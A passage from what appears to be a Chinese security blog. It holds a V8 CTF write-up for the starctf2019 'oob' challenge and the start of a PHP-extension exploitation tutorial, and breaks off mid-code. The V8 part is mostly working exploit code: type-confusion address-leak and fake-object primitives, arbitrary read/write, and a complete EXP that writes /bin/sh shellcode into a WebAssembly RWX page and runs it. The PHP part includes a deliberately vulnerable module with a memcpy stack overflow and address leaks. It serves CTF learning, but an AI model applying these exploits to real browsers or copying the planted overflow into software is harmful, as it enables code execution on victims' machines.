    Length           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\n### (3)类型混淆\n\n即当我们能够修改`ArrayObject`的map属性时，就能够造成类型混淆。比如\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//创建一个浮点数数组\nlet obj = {\"a\": 1};//创建一个对象\nlet obj_array = [obj];//创建一个对象数组\nlet float_array_map = float_array[4];//假设可以越界将float_array的map属性的值读出来\n\n//假设可以越界写obj_array的map属性，修改为浮点数数组的map属性的值\nobj_array[1] = float_array_map;\n\n//由于obj_array的map属性被修改为浮点数数组的map属性\n//那么此时当js去解析的时候，就会把obj_array[0]当作一个浮点数\n//从而能够读出obj_array[0]的地址,即obj的地址\nlet obj_addr = f2i(obj_array[0]);//f2i为浮点转无符号整数函数\n```\n\n同样的，当我们能够修改把一个浮点数数组的map属性改为对象数组的map属性时，就能够使得v8认为该浮点数数组中的浮点数实际是一个对象，而我们控制数组中的变量的值为一个地址，这样就能将一个任意地址转化为一个obj对象了。\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//创建一个浮点数数组\nlet obj = {\"a\": 1};//创建一个对象\nlet obj_array = [obj];//创建一个对象数组\nlet obj_array_map = obj_array[1];//假设可以越界将obj_array的map属性的值读出来\n\n//假设可以越界写float_array的map属性，修改为obj_array的map属性的值\nfloat_array[4] = obj_array_map;\n\n//由于float_array的map属性被修改为对象数组的map属性\n//那么此时当js去解析的时候，就会把float_array[0]当作一个对象\n//从而能够伪造任意地址为一个虚假的对象\nfake_obj_addr = i2f(0x111111);//i2f为整数转浮点数\nfloat_array[0] = fake_obj_addr;\nlet fake_obj = float_array[0];//获取该虚假对象\n```\n\n\n\n# 三、实际题目\n\n参考：[从一道CTF题零基础学V8漏洞利用 – backup (4hou.win)](https://4hou.win/wordpress/?p=32405)\n\n## 1.题目分析\n\n添加的diff如下，主要是一下两部分，其他部分加入的就只是为了正常运行而已\n\n```diff\n+    SimpleInstallFunction(isolate_, proto, \"oob\",\n+                          Builtins::kArrayOob,2,false);\n\n\n+BUILTIN(ArrayOob){\n+    uint32_t len = args.length();\n+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();\n+    Handle<JSReceiver> receiver;\n+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(\n+            isolate, receiver, Object::ToObject(isolate, args.receiver()));\n+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);\n+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());\n+    uint32_t length = static_cast<uint32_t>(array->length()->Number());\n+    if(len == 1){\n+        //read\n+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));\n+    }else{\n+        //write\n+        Handle<Object> value;\n+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(\n+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));\n+        elements.set(length,value->Number());\n+        return ReadOnlyRoots(isolate).undefined_value();\n+    }\n+}\n\n\n\n\n#以下两部分只是为了能正常运行这个添加的函数而已\n+  CPP(ArrayOob)        \\\n\n\n+    case Builtins::kArrayOob:\n+      return Type::Receiver();\n \n```\n\n即添加了为数组对象`ArrayOob`添加了一个函数oob()，其功能为\n\n- 当参数只有一个(默认传入this指针)，返回数组最后一个元素之后的元素\n- 当参数有两个(除了this指针之外再传入一个参数)，就用我们传入的参数覆盖数组最后一个元素之后的元素\n- 其他情况下返回一个undefined\n\n即该函数可以实现**读/写**数组对象MAP属性\n\n## 2.漏洞分析\n\n关键在于数组对象`ArrayOob`的内存空间，尝试看一下\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];\n%DebugPrint(float_array);\n%SystemBreak();\n```\n\n调试跑起来，查看elements处的内存\n\n![image-20220318201300196](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png)\n\n即在数组对象的元素之后为数组对象的结构体，之前也提到过。而对象的map如果能被修改，就能引起v8的类型混淆，之前已经提到过。\n\n那么我们利用类型混淆，来构造获取任意对象的地址的函数`getAddress(obj)`以及修改任意地址为对象的函数`getFakeObj(addr)`\n\n### (1)构造转化函数\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//创建一个浮点数数组\nlet obj = {\"a\": 1};//创建一个对象\nlet obj_array = [obj];//创建一个对象数组\nlet float_array_map = float_array.oob()\nlet obj_array_map = obj_array.oob()\n\nfunction getAddress(obj)\n{\n    obj_array[0] = obj;//设置对象数组\n    obj_array.oob(float_array_map);//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取\n    //从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址\n    //正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆\n    let addr = mem.f2i(obj_array[0])\n    obj_array.oob(obj_map);//重新设置回来\n    return addr;\n}\n\n\nfunction getFakeObj(addr)\n{\n    float_array[0] = mem.i2f(addr);//设置浮点数数组\n    float_array.oob(obj_array_map);//设置map属性将浮点数数组转化为对象数组\n    let fake_obj = float_array[0];//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象\n    float_array.oob(float_map);//重新设置回来\n    return fake_obj;\n}\n```\n\n实际测试一下\n\n```js\nlet obj_addr = getAddress(obj);\nconsole.log(\"[*]obj_addr:\"+hex(obj_addr));\n%DebugPrint(obj)\n%SystemBreak()\n```\n\n可以看到成功获取地址\n\n![image-20220322121328820](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png)\n\n但是这么判断转化对象成功不太知道...\n\n### (2)利用转化函数构造任意读写\n\n得到了上述的转化函数，那么我们可以借助这两个转化函数来获取任意地址读和任意地址写\n\n#### 原理：\n\n利用`getFakeObj`将一个地址转化为一个浮点数组对象，而如果该地址指向的elements指针可控，那么我们就能够修改其elements指针，从而指向任意地方，去进行读写操作。\n\n需要注意的是，由于依据elements读写的时候没有进行检测，所以只要成功修改了elements指针，那么我们我们就能从elements实际存放数据的地方，也就是*(elements+0x10)处读写我们的数据，造成任意地址读写。\n\n假定申请`fake_array[6]`，如下图布局\n\n![未命名文件 (2)](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png)\n\n即如上图所示，设置`fake_array_addr-0x40+0x10`的地址为一个`fake_obj`，那么该`fake_obj`相关的属性如下\n\n- `map`即为`float_array_map`，可以由fake_array[0]进行控制，由此可以进行元素读写\n\n- `protototype`即设置为0，可由`fake_array[1]`进行控制\n- `elements`即设置为我们需要读写的地址，可由`fake_array[2]`进行控制\n\n那么即可完成整个读写布局。\n\n#### 代码：\n\n```js\nlet fake_array = [\n    float_array_map,\n    mem.i2f(0n),\n    mem.i2f(0x41414141n),\n    mem.i2f(0x1000000000n),\n    1.1,\n    2.2,\n];\nlet fake_array_addr = getAddress(fake_array);\nlet fake_object_addr = fake_array_addr - 0x40n + 0x10n;\nlet fake_object = getFakeObj(fake_object_addr);\n\nfunction read64(addr)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    let leak_data = mem.f2i(fake_object[0]);\n    console.log(\"[*] leak from: \" +hex(addr) + \": \" + hex(leak_data));\n    return leak_data;\n}\n\nfunction write64(addr, data)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    fake_object[0] = mem.i2f(data);\n    console.log(\"[*] write to : \" +hex(addr) + \": \" + hex(data));    \n}\n```\n\n#### 测试效果：\n\n```js\n%DebugPrint(fake_array);\nconsole.log(\"[*] fake_array_addr:\" + hex(fake_array_addr));\nconsole.log(\"[*] fake_object_addr:\" + hex(fake_object_addr));\nread64(fake_array_addr-0x40n+0x28n-1n);\nwrite64(fake_object_addr+0x18n-1n,0x01020304n);\n%SystemBreak();\n```\n\n那么我们即读写fake_array[3]处的值，可以看到成功读写\n\n![image-20220322152925354](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png)\n\n## 3.实际利用\n\n### (1)常规堆思路\n\n通过泄露d8的ELF地址，计算其GOT表地址，任意读泄露出libc地址，然后覆盖`free_hook`为`system`函数，之后通过`console.log('/bin/sh\\x00')`即可释放一个包含`/bin/sh`的堆块完成利用\n\n这个泄露地址部分有点不太好搞，随机泄露的部分没看，稳定泄露的部分不太对，获取到的不是d8中的指令地址，而是一个lib库的指令地址。\n\n🔺后面补把\n\n### (2)利用WASM机制\n\n如下可以将C语言直接转换为wasm并生成JS配套调用代码\n\n[WasmFiddle (wasdk.github.io)](https://wasdk.github.io/WasmFiddle/)\n\nwasm就是一个用来调用C代码的机制，可以自己去看看，但是不能赋予危险的代码来调用，只能运行数学计算、图像处理等系统无关的高级语言代码。\n\n简单来说，我们可以创建一片WASM的空间，然后如果我们可以修改到这片运行WASM代码的内存空间(利用上述的任意写)，修改其为shellcode，然后当d8调用WASM的接口时，就可以调用到我们的shellcode了。\n\n而运行WASM代码的内存空间即为WASM_instance+0x88处\n\n```js\nlet wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nlet wasmModule = new WebAssembly.Module(wasmCode);\nlet wasmInstance = new WebAssembly.Instance(wasmModule, {});\n```\n\n也就是上述的`wasmInstance`地址+0x88处\n\n其中wasmCode的功能为\n\n```c\nint main() { \n    return 42;\n}\n```\n\n#### ①泄露地址\n\n```js\nlet wasm_instance_addr = getAddress(wasmInstance);\nconsole.log(\"[*] wasm_instance_addr: \" + hex(wasm_instance_addr));\nlet rwx_page_addr = read64(wasm_instance_addr -1n + 0x88n);\nconsole.log(\"[*] rwx_page_addr: \" + hex(rwx_page_addr));\n```\n\n#### ②写入shellcode到wasm的rwx段\n\n这里有个问题，就是连续使用两次`write64`会出错，具体原因不清楚，说什么floatArray已经被篡改，再检测合法性会出错，被篡改成啥也不知道啊，这边有点问题，之后看能不能补上。\n\n🔺\n\n那么依据大佬的，需要进行修改，使用`dataview`来进行修改\n\n原理即为\n\nDataView对象中的`backing_store`会指向申请的`data_buf`（`backing_store`相当于我们的elements），修改`backing_store`为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。\n\n🔺\n\n不太懂\n\n```js\nfunction writeAny(addr,data)\n{\n  let data_buf = new ArrayBuffer(data.length * 8);\n  let data_view = new DataView(data_buf);\n  let buf_backing_store_addr = getAddress(data_buf) + 0x20n;\n  console.log(\"[*] buf_backing_store_addr: \"+hex(buf_backing_store_addr));\n\n  write64(buf_backing_store_addr-1n,addr);\n  for (let i = 0; i < data.length; ++i)\n    data_view.setFloat64(i * 8, mem.i2f(data[i]), true);\n}\n\n\nlet shellcode = [\n  0x2fbb485299583b6an,\n  0x5368732f6e69622fn,\n  0x050f5e5457525f54n\n];\nwriteAny(rwx_page_addr,shellcode);\n```\n\n#### ③调用wasm来执行shellcode\n\n```js\nf();\n```\n\n直接通过这个调用即可。\n\n#### EXP:\n\n```js\nfunction hex(i)\n{\n    return '0x'+i.toString(16).padStart(16, \"0\");\n}\nclass Memory{\n    constructor(){\n        this.buf = new ArrayBuffer(16);\n        this.float64 = new Float64Array(this.buf);\n        // this.u32 = new Uint32Array(this.buf);\n        // this.bytes = new Uint8Array(this.buf);\n        this.bigUint64 = new BigUint64Array(this.buf);\n    }\n    f2i(val){\n        this.float64[0] = val;\n        return this.bigUint64[0];\n    }\n    i2f(val){\n        this.bigUint64[0] = val;\n        return this.float64[0];\n    }\n}\n\nlet mem = new Memory()\nlet float_array = [1.1,2.2,3.3,4.4];//创建一个浮点数数组\nlet obj = {\"a\": 1};//创建一个对象\nlet obj_array = [obj];//创建一个对象数组\nlet float_array_map = float_array.oob()\nlet obj_array_map = obj_array.oob()\n\n\nfunction getAddress(obj)\n{\n    obj_array[0] = obj;//设置对象数组\n    obj_array.oob(float_array_map);//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取\n    //从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址\n    //正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆\n    let obj_addr = mem.f2i(obj_array[0])\n    obj_array.oob(obj_array_map);//重新设置回来\n    return obj_addr;\n}\n\n\nfunction getFakeObj(addr)\n{\n    float_array[0] = mem.i2f(addr);//设置浮点数数组\n    float_array.oob(obj_array_map);//将浮点数数组转化为对象数组\n    let fake_obj = float_array[0];//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象\n    float_array.oob(float_array_map);//重新设置回来\n    return fake_obj;\n}\n\n\n\n\nlet fake_array = [\n    float_array_map,\n    mem.i2f(0n),\n    mem.i2f(0x41414141n),\n    mem.i2f(0x1000000000n),\n    1.1,\n    2.2,\n];\nlet fake_array_addr = getAddress(fake_array);\nlet fake_object_addr = fake_array_addr - 0x40n + 0x10n;\nlet fake_object = getFakeObj(fake_object_addr);\nconsole.log(\"[*] fake_array_addr:\" + hex(fake_array_addr));\nconsole.log(\"[*] fake_object_addr:\" + hex(fake_object_addr));\n\nfunction read64(addr)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    let leak_data = mem.f2i(fake_object[0]);\n    console.log(\"[*] leak from: \" +hex(addr) + \": \" + hex(leak_data));\n    return leak_data;\n}\n\nfunction write64(addr, data)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    fake_object[0] = mem.i2f(data);\n    console.log(\"[*] write to : \" +hex(addr) + \": \" + hex(data));    \n}\n\nfunction writeAny(addr,data)\n{\n  let data_buf = new ArrayBuffer(data.length * 8);\n  let data_view = new DataView(data_buf);\n  let buf_backing_store_addr = getAddress(data_buf) + 0x20n;\n  console.log(\"[*] buf_backing_store_addr: \"+hex(buf_backing_store_addr));\n\n  write64(buf_backing_store_addr-1n,addr);\n  for (let i = 0; i < data.length; ++i)\n    data_view.setFloat64(i * 8, mem.i2f(data[i]), true);\n}\n\nlet wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nlet wasmModule = new WebAssembly.Module(wasmCode);\nlet wasmInstance = new WebAssembly.Instance(wasmModule, {});\nlet f = wasmInstance.exports.main;\nlet wasm_instance_addr = getAddress(wasmInstance);\nconsole.log(\"[*] wasm_instance_addr: \" + hex(wasm_instance_addr));\nlet rwx_page_addr = read64(wasm_instance_addr -1n + 0x88n);\nconsole.log(\"[*] rwx_page_addr: \" + hex(rwx_page_addr));\nlet shellcode = [\n  0x2fbb485299583b6an,\n  0x5368732f6e69622fn,\n  0x050f5e5457525f54n\n];\nwriteAny(rwx_page_addr,shellcode);\n//%SystemBreak();\nf();\n\n```\n\n![image-20220322194115446](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png)\n\n\n\n\n\n[starctf2019/pwn-OOB at master · sixstars/starctf2019 (github.com)](https://github.com/sixstars/starctf2019/tree/master/pwn-OOB)\n\n","tags":["V8"],"categories":["PWN","V8"]},{"title":"PHP_PWN入门","url":"/2022/02/10/PHP_PWN/","content":"\n# 一、php拓展模块搭建和编写\n\n## 1.创建模块模板\n\n找到php源码目录\n\n![image-20220210174644261](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120778.png)\n\n然后使用`ext_skel`创建一个模板\n\n```\n./ext_skel --extname=helloworld\n```\n\n## 2.编译模块\n\n随后进行编译，跳转到刚刚生成的模块文件夹路径`/path_to_php_src/ext/helloworld`，然后编译\n\n```\n/www/server/php/56/bin/phpize\n./configure  --with-php-config=/www/server/php/56/bin/php-config\n```\n\n这里需要指定一下`--with-php-config`，选择自己的`php-config`，当然如果本地的环境变量bin命令下直接有`php-config`也不用指定了，随后\n\n```\nmake\n```\n\n这样就可以在当前目录下生成了\n\n![image-20220210175900511](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120756.png)\n\n其中`helloworld.c`即为创建的模板代码，但是不知道为什么5.6版本的编译完成后，不生成.so模块文件，可能是版本特性？\n\n```C\n/* helloword extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_helloword.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n/* {{{ void helloword_test1()\n */\nPHP_FUNCTION(helloword_test1)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n/* }}} */\n\n/* {{{ string helloword_test2( [ string $var ] )\n */\nPHP_FUNCTION(helloword_test2)\n{\n\tchar *var = \"World\";\n\tsize_t var_len = sizeof(\"World\") - 1;\n\tzend_string *retval;\n\n\tZEND_PARSE_PARAMETERS_START(0, 1)\n\t\tZ_PARAM_OPTIONAL\n\t\tZ_PARAM_STRING(var, var_len)\n\tZEND_PARSE_PARAMETERS_END();\n\n\tretval = strpprintf(0, \"Hello %s\", var);\n\n\tRETURN_STR(retval);\n}\n/* }}}*/\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(helloword)\n{\n#if defined(ZTS) && defined(COMPILE_DL_HELLOWORD)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(helloword)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"helloword support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ helloword_functions[]\n */\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ helloword_module_entry\n */\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_HELLOWORD\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(helloword)\n#endif\n\n```\n\n## 🔺注：不同版本创建模板\n\n需要注意的是，在php7.3以上，`ext_skel`这个shell变成了`ext_skel.php`，所以我们使用如下来创建\n\n```\n/www/server/php/73/bin/php ./ext_skel.php --ext helloword\ncd helloworld\n/www/server/php/73/bin/phpize\n./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config\nmake\n```\n\n## 🔺注：默认的保护措施\n\n同时需要注意的是，在configure设置完之后，保护措施也需要设置一下，默认编译的保护如下：\n\n![image-20220212124731449](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121247504.png)\n\n可以看到除了RELRO没有加强保护之外，其他都加入了，我们在Makefile中可以进行相关的保护措施消除\n\n这里试了很多遍，貌似只能关掉Canary保护和FORTIFY保护\n\n![image-20220212125859899](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121258947.png)\n\n\n\n\n\n## 3.加载模块\n\n### 方法一：\n\n直接`make install`，然后在对应的php.ini中添加`extension=helloword.so`\n\n### 方法二：\n\n复制modules下的helloworld.so模块到对应的php扩展目录\n\n```\ncp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/\n```\n\n同样也得在php.ini中添加extension\n\n之后使用模板中函数测试即可\n\n```\n<?php\nhelloword_test1();\n?>\n```\n\n如下即可成功\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120676.png)\n\n这个php拓展模块其实跟linux内核有点像\n\n## 🔺注：php.ini的设置\n\n需要注意的是php.ini(php-fpm的php.ini)和php-cli.ini(php-cli的php.ini)的区别设置\n\n对于php-fpm的php.ini，只会在web服务器上生效，而对于php-cli的php.ini才是在命令行中生效，所以如果我们需要使用命令行直接调试php，那么就需要修改php-cli中的php.ini才行的。以下是用宝塔linux搭建的Php环境，如果在命令行中生效则需要修改Php-cli.ini才行的。\n\n![image-20220211160511335](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111605414.png)\n\n\n\n\n\n## 4.编写函数\n\n以下是php7及以上的语法，之前版本的会有所不同\n\n### (1)PHP_FUNCTION\n\n### ①框架编写\n\n由`PHP_FUNCTION` 修饰的函数相当于直接的定义函数，所以我们定义函数时，需要用该修饰符来修饰，格式如下\n\n```c\nPHP_FUNCTION(funcName)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n```\n\n至于这个`ZEND_PARSE_PARAMETERS_NONE();`代表定义的该函数无参数传递。\n\n### ②参数传递\n\n而当我们需要给函数传递参数时，就需要用到`ZEND_PARSE_PARAMETERS_START`来设置函数的参数个数\n\n```c\nchar *var = \"World\";\nsize_t var_len = sizeof(\"World\") - 1;\nZEND_PARSE_PARAMETERS_START(0, 1)       \n    Z_PARAM_OPTIONAL             \n    Z_PARAM_STRING(var, var_len)   \nZEND_PARSE_PARAMETERS_END(); \n\n//老版本写法：\nchar *var = NULL;\nsize_t var_len;\nif (zend_parse_parameters(ZEND_NUM_ARGS(), \"s\", &var, &var_len) == FAILURE) {\n    return;\n}\n```\n\n上述的`ZEND_PARSE_PARAMETERS_START(0, 1)`即代表传入参数个数为`0~1`，可变个数，如果个数不符合，则会触发异常。同样也可以设置为`1~1`，`2~4`等等之类的。\n\n`Z_PARAM_STRING`代表一种参数类型，即`char*`，传入的参数给到var，长度给到var_len，还有的其他类型如下。\n\n```c\nspecifier    Fast ZPP API macro    args\n|    Z_PARAM_OPTIONAL\na    Z_PARAM_ARRAY(dest)    dest - zval*\nA    Z_PARAM_ARRAY_OR_OBJECT(dest)    dest - zval*\nb    Z_PARAM_BOOL(dest)    dest - zend_bool\nC    Z_PARAM_CLASS(dest)    dest - zend_class_entry*\nd    Z_PARAM_DOUBLE(dest)    dest - double\nf    Z_PARAM_FUNC(fci, fcc)    fci - zend_fcall_info, fcc - zend_fcall_info_cache\nh    Z_PARAM_ARRAY_HT(dest)    dest - HashTable*\nH    Z_PARAM_ARRAY_OR_OBJECT_HT(dest)    dest - HashTable*\nl    Z_PARAM_LONG(dest)    dest - long\nL    Z_PARAM_STRICT_LONG(dest)    dest - long\no    Z_PARAM_OBJECT(dest)    dest - zval*\nO    Z_PARAM_OBJECT_OF_CLASS(dest, ce)    dest - zval*\np    Z_PARAM_PATH(dest, dest_len)    dest - char*, dest_len - int\nP    Z_PARAM_PATH_STR(dest)    dest - zend_string*\nr    Z_PARAM_RESOURCE(dest)    dest - zval*\ns    Z_PARAM_STRING(dest, dest_len)    dest - char*, dest_len - int\nS    Z_PARAM_STR(dest)    dest - zend_string*\nz    Z_PARAM_ZVAL(dest)    dest - zval*\n     Z_PARAM_ZVAL_DEREF(dest)    dest - zval*\n+    Z_PARAM_VARIADIC('+', dest, num)    dest - zval*, num int\n*    Z_PARAM_VARIADIC('*', dest, num)    dest - zval*, num int\n```\n\n参照：[AntCTF ^ D3CTF 2021 hackphp - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/233831#h3-3)\n\n### ③参数信息定义\n\n```c\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n```\n\n这里就在`ZEND_BEGIN_ARG_INFO`中定义了参数arginfo_helloword_test1和arginfo_helloword_test2，然后在`ZEND_ARG_INFO`中设置参数名称，在`ZEND_ARG_INFO`中第一个参数代表是否为引用，第二个参数设置名称，比如这里就设置为`str`。这个参数信息的定义在之后的函数注册中需要用到。\n\n参照：[Linux下PHP7扩展开发入门教程3：编写第一个函数 | 毛英东的个人博客 (maoyingdong.com)](https://www.maoyingdong.com/php7_extension_development_tutorial_3/)\n\n\n\n## (2)函数注册\n\n和内核类似，需要将我们编写的函数进行注册\n\n```C\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n```\n\n如上，即使用`PHP_FE`来注册函数，需要传入函数名称和函数参数定义信息。\n\n## (3)模块注册\n\n最后整个模块使用`zend_module_entry`进行模块注册\n\n```c\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n```\n\n\n\n\n\n# 二、调试php拓展\n\n## 1.查找模块\n\n查找php拓展模块\n\n```\nphp -i | grep extensions\nphp -i | grep -i extension_dir\n```\n\n## 2.开始调试\n\n如下，调试php程序，然后跑起来，使得加载进入拓展模块，ctrl+c中断后即可对特定函数下断点，然后再跑`test.php`，该php调用需要调试的拓展模块中的函数，继续运行即可断点。\n\n```\ngdb /www/server/php/73/bin/php\nr\n(ctrl+c中断)\nb zif_funcName\nr test.php\nc\n```\n\n这里可以看到我们使用拓展模块注册的函数最终都会以`zif_`整个前缀进行修饰，所以当做CTF题时，直接搜索zif从中寻找函数进行解析即可。\n\n如下\n\n![image-20220211111702925](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111117225.png)\n\n\n\n## 🔺测试用例\n\n### (1)栈模块\n\n传入任意长度的字符串，拷贝给data，导致栈溢出\n\n```c\n/* my_stack extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_my_stack.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n\n\nPHP_FUNCTION(my_stack_gift)\n        {\n        \tchar gift_data[0x10];\n        \tzend_string *retval;\n            ZEND_PARSE_PARAMETERS_NONE();\n            php_printf(\"PHP_Stack Gift function!---000\\n\");\n\t\t    retval = strpprintf(0, \"Gift_Stack:0x%lx\\nGift_Libc:0x%lx\\nGift_ELF:0x%lx\\n\",&gift_data,&printf,&zif_my_stack_gift);\n\t\t\tRETURN_STR(retval);\n        }\n\n\nPHP_FUNCTION(my_stack_func)\n        {\n        \t\n        \tchar* buf = \"stackTest\";\n        \tsize_t buf_len = sizeof(\"stackTest\") - 1;\n        \tZEND_PARSE_PARAMETERS_START(1,1)\n            Z_PARAM_STRING(buf, buf_len)\n            ZEND_PARSE_PARAMETERS_END();\n\n\n\t\t\tchar data[0x10];\n        \tphp_printf(\"Welcome to my Stack!\\n\");\n        \tphp_printf(\"\t\t   --PIG-007\\n\");\n\n        \tphp_printf(\"Gift_Stack:0x%lx\\n\",&data);\n\t\t    php_printf(\"Gift_Libc:0x%lx\\n\",&printf);\n\t\t    php_printf(\"Gift_ELF:0x%lx\\n\",&zif_my_stack_func);\n\n        \tmemcpy(data,buf,buf_len);\n        \tphp_printf(\"Over!\\n\");\n        